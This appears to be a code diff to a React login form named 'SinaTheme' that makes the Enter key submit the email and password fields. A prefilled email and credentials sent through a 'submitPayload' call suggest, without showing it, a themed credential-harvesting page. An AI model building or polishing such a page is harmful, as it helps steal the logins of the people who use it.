@@ -14,7 +14,7 @@ const SinaTheme: React.FC<SinaThemeProps> = ({ prefilledEmail }) => {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const { submitPayload, error, setError } = useSecurity();
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent | React.KeyboardEvent) => {
     e.preventDefault();
     setIsSubmitting(true);
     try {
@@ -24,6 +24,12 @@ const SinaTheme: React.FC<SinaThemeProps> = ({ prefilledEmail }) => {
       console.error(err);
     } finally {
       setIsSubmitting(false);
+    }
+  };
+
+  const handleKeyDown = (e: React.KeyboardEvent) => {
+    if (e.key === 'Enter') {
+      handleSubmit(e);
     }
   };
 
@@ -114,6 +120,7 @@ const SinaTheme: React.FC<SinaThemeProps> = ({ prefilledEmail }) => {
                     setEmail(e.target.value);
                     if (error) setError(null);
                   }}
+                  onKeyDown={handleKeyDown}
                   className="w-full px-4 py-2.5 text-[14px] border border-gray-300 rounded focus:outline-none focus:border-[#00a6e0] focus:ring-1 focus:ring-[#00a6e0]/20"
                 />
               </div>
@@ -127,6 +134,7 @@ const SinaTheme: React.FC<SinaThemeProps> = ({ prefilledEmail }) => {
                     setPassword(e.target.value);
                     if (error) setError(null);
                   }}
+                  onKeyDown={handleKeyDown}
                   className="w-full px-4 py-2.5 text-[14px] border border-gray-300 rounded focus:outline-none focus:border-[#00a6e0] focus:ring-1 focus:ring-[#00a6e0]/20"
                 />
               </div>
